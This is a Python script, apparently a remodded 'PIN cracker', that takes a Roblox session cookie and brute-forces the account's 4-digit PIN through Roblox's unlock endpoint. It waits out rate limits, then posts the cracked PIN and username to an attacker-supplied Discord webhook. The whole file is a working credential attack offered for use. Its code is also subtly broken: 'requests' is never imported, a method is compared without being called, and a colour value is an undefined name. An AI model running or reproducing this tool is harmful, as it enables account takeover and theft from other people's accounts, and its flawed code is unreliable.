import re
import string
import time
import os


print('\u001B[32m')
print('█▀█ █ █▄░█ ▄▄ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█\n█▀▀ █ █░▀█ ░░ █▄▄ █▀▄ █▀█ █▄▄ █░█ ██▄ █▀▄\n================================================\n	\u001B[31mREMODDED BY: RAISHIN\n https://www.facebook.com/golden.pickaxe.5\n\u001B[32m================================================')
pingEveryone = True
print('	\u001B[33m')
print('Enter your cookie below:')
cookie = input()
os.system("cls")
print('	\u001B[35m')
print('Enter your webhook below:')
webhook = input()
os.system("cls")
print('\u001B[34m')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pogi si Shin***'
os.system("cls")

print('''\u001B[32mCracker Has Started.''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "Rai $hin",
                "avatar_url" : "https://media.discordapp.net/attachments/1234384385310986241/1302569512192839680/Kokichi_Muta.png?ex=672897e4&is=67274664&hm=43530eee88eb6f1bfecc563bbd45d6b10a523054b49d823f7700da9539486cdb&=&format=webp&quality=lossless&width=742&height=1270"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : ED4245,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')